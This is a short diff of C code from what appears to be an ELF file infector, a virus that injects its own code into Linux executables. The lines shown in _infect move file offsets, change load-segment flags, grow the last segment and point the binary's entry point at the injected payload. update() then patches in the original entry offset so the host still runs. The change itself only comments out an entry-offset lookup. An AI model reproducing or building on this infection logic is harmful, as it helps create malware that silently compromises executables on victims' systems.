@@ -71,7 +71,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_addr, size_t text_length){
 	//add a few information about himself
 	Elf64_Ehdr *bh = (void*)b;
-	size_t pos = elf_offset_entry(b, n);
+	size_t pos = 0/*elf_offset_entry(b, n)*/;
 	//modifying 2bit after
 	size_t *p = ((size_t *)(char*)(b + pos + DATA));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
@@ -116,7 +116,7 @@ static int _infect(char **s, size_t *n, char *b, size_t bn){
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
 	elf_change_size_last_load_segment(*s, *n, bn);
-	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
+	elf_set_off_entry(*s, *n, pos + 1 /*+ elf_offset_entry(b, bn)*/);
 	h = (void*)*s;
 	update((*s) + pos + 1, bn, old_entry, h->e_entry, text_addr, text_length);
 	return TRUE;
